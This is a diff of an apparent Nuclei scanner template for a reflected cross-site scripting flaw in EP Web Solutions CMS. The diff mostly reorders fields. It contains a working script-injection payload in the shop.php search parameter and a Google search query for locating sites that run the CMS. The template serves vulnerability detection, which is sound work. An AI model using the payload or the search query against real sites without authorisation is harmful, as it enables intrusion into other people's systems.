@@ -1,5 +1,4 @@
 id: ep-web-cms-xss
-
 info:
   name: EP Web Solutions CMS - Cross Site Scripting
   author: r3Y3r53
@@ -12,23 +11,20 @@ info:
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
     cvss-score: 6.1
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
-    verified: true
-    max-request: 1
     google-query: intext:"EPweb " || intext:" Evergreen Park Web"
-  tags: xss,epweb,unauth,cms,vuln
-
+    max-request: 1
+    verified: true
+  tags: cms,epweb,unauth,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/shop.php?search=%22/%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
-
-    matchers:
-      - type: dsl
+  - matchers:
+      - condition: and
         dsl:
-          - 'status_code == 200'
-          - 'contains(content_type, "text/html")'
-          - 'contains(body, "/><script>alert(document.domain)</script>") && contains(body, "EPweb")'
-        condition: and
-
+          - status_code == 200
+          - contains(content_type, "text/html")
+          - contains(body, "/><script>alert(document.domain)</script>") && contains(body, "EPweb")
+        type: dsl
+    method: GET
+    path:
+      - '{{BaseURL}}/shop.php?search=%22/%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
